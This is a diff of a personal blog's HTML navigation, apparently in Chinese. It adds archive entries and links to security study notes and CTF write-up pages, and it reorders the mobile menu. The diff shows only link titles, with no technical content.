+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -226,7 +1023,23 @@
       <ul>
         
           <li>
-            <a href="/2026/06/25/welcome/">(no title)</a>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
           </li>
         
       </ul>
@@ -253,15 +1066,15 @@
   
     <a href="/" class="mobile-nav-link">Home</a>
   
-    <a href="/resume" class="mobile-nav-link">简历</a>
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
   
     <a href="/tools" class="mobile-nav-link">工具</a>
   
     <a href="/projects" class="mobile-nav-link">项目</a>
   
-    <a href="/xctf" class="mobile-nav-link">XCTF</a>
-  
-    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+    <a href="/resume" class="mobile-nav-link">简历</a>
   
     <a href="/about" class="mobile-nav-link">关于我</a>
   
